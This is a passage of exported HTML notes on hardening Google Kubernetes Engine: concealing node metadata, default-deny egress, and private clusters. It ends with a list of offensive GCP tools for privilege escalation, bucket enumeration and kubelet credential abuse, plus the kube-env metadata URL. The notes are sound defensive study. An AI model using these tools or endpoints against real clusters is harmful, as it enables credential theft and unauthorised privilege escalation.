id="9567193a-8df3-42d0-9b08-3ef1ff4d5a3a" class="bulleted-list"><li style="list-style-type:disc">use <code><strong>--workload-metadata-from-node=SECURE</strong></code><strong> </strong>to conceal metadata<ul id="0ac4e84c-a1cf-4a91-8d58-d5553bc0e0ea" class="bulleted-list"><li style="list-style-type:circle">will return “This metada endpoint is concelead” when querying <code>http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env</code></li></ul></li></ul><p id="4c2fa9b6-e268-4a02-b3f2-1226fd1390af" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Network Policy</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><ul id="ee3c188e-abe4-4ae4-80ba-aded9d4d3e0c" class="bulleted-list"><li style="list-style-type:disc">deny egress by default, whitelist only necessary egress traffic</li></ul><ul id="bf7bc390-f9e6-4052-a963-88b134d90f1c" class="bulleted-list"><li style="list-style-type:disc">applied to pods since</li></ul><ul id="cc5b9701-bfd5-4e52-aad4-af1ab140b84c" class="bulleted-list"><li style="list-style-type:disc">block metadata service if not needed</li></ul><p id="7938ef81-bf93-4368-b0db-650d754b7567" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Other Mitigations</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><ol type="1" id="1e41d3ff-6379-41e6-b38d-d72ca8e94215" class="numbered-list" start="1"><li>Service mesh with egress gateway<ol type="a" id="29c1fd22-e63d-4f98-87d9-79e3a4dab928" class="numbered-list" start="1"><li>prevent communication from containers to unauthorized hosts</li></ol></li></ol><ol type="1" id="71374b75-987d-4519-b1d9-7d676c42ff48" class="numbered-list" start="2"><li>Restrict network access to masters<ol type="a" id="2de16b09-5b5e-4e4c-afe5-8dd9961d1ac5" class="numbered-list" start="1"><li>Create private cluster with public access disabled and use jumpbox in VPC to access API</li></ol></li></ol><p id="85e976b9-0f26-4f6e-a445-5625a420dc90" class="">
</p><h1 id="3101e5a8-538e-4adf-9f74-5ffaf39eea76" class="">Tools</h1><p id="3a5ef25b-404d-417f-a603-e889ed923af9" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation">GCP-IAM-Privesc</a></p><ul id="92fa343c-890c-4c9a-81bf-3e02ddb7d6f2" class="bulleted-list"><li style="list-style-type:disc">contains privesc scanners and exploits to automate exploitation</li></ul><p id="97f8cf8c-74e8-4dea-888d-554133ed3dc1" class=""><a href="https://github.com/RhinoSecurityLabs/GCPBucketBrute">GCP Bucket Brute</a></p><ul id="7452fc1f-9260-4115-870e-8150d5026720" class="bulleted-list"><li style="list-style-type:disc">enumerates buckets to see if they can be accessed or used for privilege escalation</li></ul><p id="fd86e870-0778-47aa-9734-056220acecc0" class=""><a href="https://github.com/marcin-kolda/gcp-iam-collector">GCP IAM Collector</a></p><ul id="3ce9f1ff-8199-403f-9fe0-8b7084263252" class="bulleted-list"><li style="list-style-type:disc">provides visualization graph for IAM permissions in GCP environment</li></ul><p id="cbc64a16-aaf0-4885-bed0-fc7a93fa2c57" class=""><a href="https://github.com/4armed/kubeletmein">Kubeletemein</a></p><ul id="92c9be0d-ebd5-4776-a3f4-6cdd099b5f1f" class="bulleted-list"><li style="list-style-type:disc">Kubernetes abuse</li></ul><ul id="79f1fbe8-db92-4661-8e05-afdbdfbbccf8" class="bulleted-list"><li style="list-style-type:disc">reads metadata instance attributes, generates CSRs and submits them to the API, and writes out a kubeconfig file for use with <code>kubectl</code></li></ul><p id="db0b82f5-1e67-41ef-bf0f-75cd129e0caf" class="">
</p></div></article></body></html>
